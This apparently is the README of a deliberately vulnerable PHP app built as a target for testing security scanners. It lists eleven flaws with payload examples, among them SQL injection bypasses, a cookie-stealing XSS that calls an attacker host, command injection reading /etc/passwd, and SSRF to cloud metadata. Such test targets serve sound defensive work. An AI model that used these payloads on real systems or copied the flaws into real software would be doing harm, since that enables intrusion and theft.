# VulnNote — Intentionally Vulnerable PHP App

A deliberately vulnerable PHP web application designed as a scan target for an AppSec CI/CD pipeline.

> **Warning:** This application contains deliberate security vulnerabilities. Run only in isolated environments. Never expose to the internet.

---

## Context

This app was generated with the help of Claude AI as a realistic scan target to validate a security pipeline. The goal was to have a PHP application with a broad set of classic web vulnerabilities — covering OWASP Top 10 categories — so that each security tool in the pipeline has something meaningful to find and report.

The pipeline runs on every PR and posts findings directly as PR comments.

---

## Pipeline

| Tool | Category | What it finds here |
|------|----------|--------------------|
| [Semgrep](https://semgrep.dev) | SAST | SQLi, XSS, LFI, command injection patterns in source |
| [Gitleaks](https://github.com/gitleaks/gitleaks) | Secrets | AWS key, Stripe key, JWT secret, SendGrid key in `config.php` |
| [Trivy](https://trivy.dev) | SCA | CVEs in outdated `composer.json` dependencies |
| [OWASP ZAP](https://www.zaproxy.org) | DAST | XSS, SQLi, path traversal via live HTTP scan |

---

## Vulnerabilities

| # | Type | File | Payload example |
|---|------|------|-----------------|
| 1 | SQL Injection (auth bypass) | `login.php` | `' OR '1'='1' --` |
| 2 | SQL Injection (data dump) | `post.php` | `1 UNION SELECT username,password FROM users--` |
| 3 | Stored XSS | `post.php` | `<script>document.location='http://attacker/?c='+document.cookie</script>` |
| 4 | Reflected XSS | `search.php` | `<img src=x onerror=alert(1)>` |
| 5 | Unrestricted File Upload → RCE | `upload.php` | Upload `shell.php`, access `/uploads/shell.php` |
| 6 | Path Traversal | `download.php` | `?file=../../config.php` |
| 7 | Local File Inclusion | `include.php` | `?page=../config` or `php://filter/...` |
| 8 | IDOR | `profile.php` | `?id=1` to view admin profile without auth |
| 9 | Insecure Deserialization | `profile.php` | Craft serialized PHP object in `prefs` cookie |
| 10 | Command Injection | `admin/ping.php` | `127.0.0.1; cat /etc/passwd` |
| 11 | SSRF | `admin/fetch.php` | `http://169.254.169.254/latest/meta-data/` |

**Bonus:**
- Hardcoded secrets in `config.php` (AWS, Stripe, SendGrid, JWT)
- Passwords stored in plaintext
- Outdated dependencies with known CVEs (`composer.json`)
- Missing `HttpOnly` / `Secure` flags on session cookie

---

## Stack

- **Language:** PHP 8.x (no framework)
- **Database:** SQLite via PDO (auto-created on first run)
- **Dependencies:** declared in `composer.json` with intentionally outdated versions

---

## Run locally

```bash
cd vulnNote
php -S localhost:8080
```

Open http://localhost:8080

### Default credentials

| Username | Password | Role  |
|----------|----------|-------|
| admin    | admin123 | admin |
| alice    | password1 | user |
| bob      | qwerty   | user  |
